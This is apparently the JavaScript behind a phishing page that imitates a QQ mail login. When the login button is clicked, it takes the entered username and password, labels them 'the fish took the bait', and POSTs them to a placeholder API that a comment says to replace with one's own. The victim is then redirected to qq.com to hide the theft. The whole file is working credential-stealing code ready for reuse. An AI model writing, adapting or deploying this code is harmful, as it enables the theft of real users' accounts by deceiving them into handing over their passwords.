/*
 * @Author: Escher1108
 * @Website: https://jkgblog.com
 * @Date: 2022-02-18 19:27:19
 * @LastEditTime: 2022-02-18 21:06:22
 * @LastEditors: Do not edit
 * @FilePath: \mailqq\js\request.js
 * @Description: 耶斯莫拉
 */
(function () {
    const login = document.querySelector('#login')
    function sendMsg() {
        const userName = document.querySelector('#name').value;
        const passWord = document.querySelector('#password').value;

        const uname = document.querySelector('#uname')
        const upwd = document.querySelector('#upwd')
        const all = document.querySelector('#all')

        if (userName == '' && passWord !== '') {
            uname.classList.add('show')
            setTimeout(() => {
                uname.classList.remove('show')
            }, 1000)
        } else if (passWord == '' && userName !== '') {
            upwd.classList.add('show')
            setTimeout(() => {
                upwd.classList.remove('show')
            }, 1000)
        } else if (passWord == '' && userName == '') {
            all.classList.add('show')
            setTimeout(() => {
                all.classList.remove('show')
            }, 1000)
        } else {
            uname.classList.remove('show')
            uname.classList.remove('show')
            all.classList.remove('show')
            let data = {
                text: "鱼上钩了",//text 固定必填且字段为 text
                desp: `账号：${userName}，密码：${passWord}`
            }

            // 这里修改成自己的api
            let url = 'https://api.xxxx.com/'

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json;charset=utf-8',
                },
                body: JSON.stringify(data),

            }).then(response => response.json())
                .then(data => {
                    setTimeout(() => {
                        window.location.href = 'https://www.qq.com/'
                    }, 3000)
                })
                .catch((error) => {
                    window.location.reload()
                });

        }


    }

    login.addEventListener('click', function () {
        sendMsg()
        console.log('daf')
    })

})();